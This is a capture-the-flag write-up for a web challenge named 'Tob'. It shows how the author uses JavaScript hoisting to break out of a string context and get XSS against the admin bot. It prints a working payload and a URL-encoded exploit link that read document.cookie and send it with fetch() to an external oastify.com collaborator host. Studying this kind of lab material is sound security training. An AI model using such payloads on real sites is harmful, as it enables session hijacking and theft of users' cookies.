---
layout: post
author: M0hmedGamal (gem0x00)
categories: [CTF, Web]
tags: [CTF-Solutions] 
---
# Tob

At first we take a look on the application we see that :\\

<figure><img src="https://1287051708-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FaS4i8I28DZfShW081NU8%2Fuploads%2FaG0lD5RsuoAbvoLLo2kb%2Fimage.png?alt=media&#x26;token=92e3967b-b505-471c-a000-ce2077a09d30" alt=""><figcaption></figcaption></figure>

And when we look at the flag place in the source code it is in the bot page so it is very easy to know that it is an XSS challenge and we'll exploit it to extract the cookie from the bot as it have the admin cookie ...

Take a look in the source code :\\

<figure><img src="https://1287051708-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FaS4i8I28DZfShW081NU8%2Fuploads%2FWTooL0LV9u7HVksN8dxN%2Fimage.png?alt=media&#x26;token=4a99c7c3-ba65-4b13-9958-3928bbbfaae2" alt=""><figcaption></figcaption></figure>

As we can see it replace the tags and in the next places in the source code it uses the `htmlspecialchars`

But there is a place very special in code for me it is :\\

<figure><img src="https://1287051708-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FaS4i8I28DZfShW081NU8%2Fuploads%2FWV5ZhwdqwOvpGq11ftgi%2Fimage.png?alt=media&#x26;token=6ef65106-eaaf-4c81-8e18-2c7cf41dabad" alt=""><figcaption></figcaption></figure>

It is at the end of the `index.php` file you see I can put my input here So I tried :

<figure><img src="https://1287051708-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FaS4i8I28DZfShW081NU8%2Fuploads%2FCx1CdZNBBEdK5QXuzX3b%2Fimage.png?alt=media&#x26;token=c0369274-4922-4bde-880d-32a5e4d0358a" alt=""><figcaption></figcaption></figure>

secure in the code is not defined and this made me a problem and the code can't move on you know at first I tried to do like that as if `try()` is not commented I would close the code like :\\

```
');}catch(e){alert();}//
```

But unfortunately `try{}` was commented also so I searched and remembered the hoisting concept in JS

and tried :

```
',alert());function secure(){};//
```

and it gave me the alert ...

<figure><img src="https://1287051708-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FaS4i8I28DZfShW081NU8%2Fuploads%2FvbmNnCK25148VyAbFB3h%2Fimage.png?alt=media&#x26;token=195c7386-ae29-46c9-b924-4c2fb3919cd7" alt=""><figcaption></figcaption></figure>

The next step is to get the cookie I typed this script :\\

```
',fetch("https://evdz9czhxctkq47barp16wm7gympagy5.oastify.com/flag?"+btoa(document.cookie))
);function secure(){};secure('
```

<figure><img src="https://1287051708-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FaS4i8I28DZfShW081NU8%2Fuploads%2FaCn6zZ8z0b83R6KFk3Pz%2Fimage.png?alt=media&#x26;token=8ab37af2-29b2-4781-8a42-6847b8faf430" alt=""><figcaption></figcaption></figure>

So let's try to exploit :\\

<figure><img src="https://1287051708-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FaS4i8I28DZfShW081NU8%2Fuploads%2FqGbnbn6SN67vdyL5GkCV%2Fimage.png?alt=media&#x26;token=90eed5b6-7b25-4e35-9c7a-e208f60875c9" alt=""><figcaption></figcaption></figure>

<figure><img src="https://1287051708-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FaS4i8I28DZfShW081NU8%2Fuploads%2FwZJKJax0kHcUuI9XoTlF%2Fimage.png?alt=media&#x26;token=fe22dc49-3196-4b3e-abfa-9fece9869ef5" alt=""><figcaption></figcaption></figure>

So which URL we would put here ?\
take a look at the `docker-compose.yaml` you'll find that :

```dockercompose
APPURL: http://proxy
```

So let's try it :

```
http://proxy/index.php?title=test&content=%27%2Cfetch%28%22https%3A%2F%2Fevdz9czhxctkq47barp16wm7gympagy5.oastify.com%2Fflag%3F%22%2Bbtoa%28document.cookie%29%29%0D%0A%29%3Bfunction+secure%28%29%7B%7D%3Bsecure%28%27&category=general
```

And yes I got the cookie :\\

<figure><img src="https://1287051708-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FaS4i8I28DZfShW081NU8%2Fuploads%2FIZEVNFSmUfb1Vpc6QeXU%2Fimage.png?alt=media&#x26;token=8dd97484-5e8e-4ba2-a7ee-1525311db430" alt=""><figcaption></figcaption></figure>

<figure><img src="https://1287051708-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FaS4i8I28DZfShW081NU8%2Fuploads%2FVzwpUNKphNzucVRUjr2Y%2Fimage.png?alt=media&#x26;token=e11e26eb-7c7f-4119-9e58-09f588649c77" alt=""><figcaption></figcaption></figure>

And Got the flag ...
